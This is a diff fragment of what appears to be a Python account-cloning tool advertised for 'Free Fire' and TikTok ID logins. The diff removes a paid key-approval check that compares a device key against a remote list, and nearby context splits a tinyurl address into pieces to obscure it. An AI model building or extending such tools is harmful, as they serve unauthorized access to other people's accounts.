@@ -319,35 +319,6 @@ d88P     888 88888888 8888888 888
 def linex():
 	print(f'{warna}═════════════════════════════════════════════{B}')
 
-#____APPROVAL SYSTEM ADD_____#
-def meyexudi():
-  os.system('clear')
-  print(logo)
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "-".join(uuid)
-  try:
-    httpCaht = requests.get('https://github.com/AL1F-IS-BACK/THE-AL1F/blob/main/aprv.txt').text
-    if id in httpCaht:
-      print(fuckyoursali)
-      print(hedaborakarent)
-      msg = str(os.geteuid())
-      #time.sleep(0.5)
-      print()
-      pass
-    else:
-      print(meyermarexudi)
-     #print(" \033[32;1m[+] Your Kay : "+id)
-      print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
-      print(' \x1b[1;93m║══[𝟸]💥  OK ID WILL BE LOGIN 100%')
-      print(' \x1b[1;97m║══[3]💥  WI-FI  AND DATA BOTH WORKING 100%')
-      #os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    ADNAN,   of,   TEAM,   𝐀𝐝𝐧𝐚𝐧→𝐊𝐢𝐧𝐠,    Please,   Send,   Your,   Key,"')
-      print(" \x1b[0m║══[4] YOUR KEY : "+id)
-      input(' \033[1;30m╚══[5] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https:facebook.com/freelancer.alif.09'),approval()      
-      time.sleep(1)
-      meyexudi()
-
-
 c0=('ht')
 c4=('tps://')
 c1=('tinyurl')
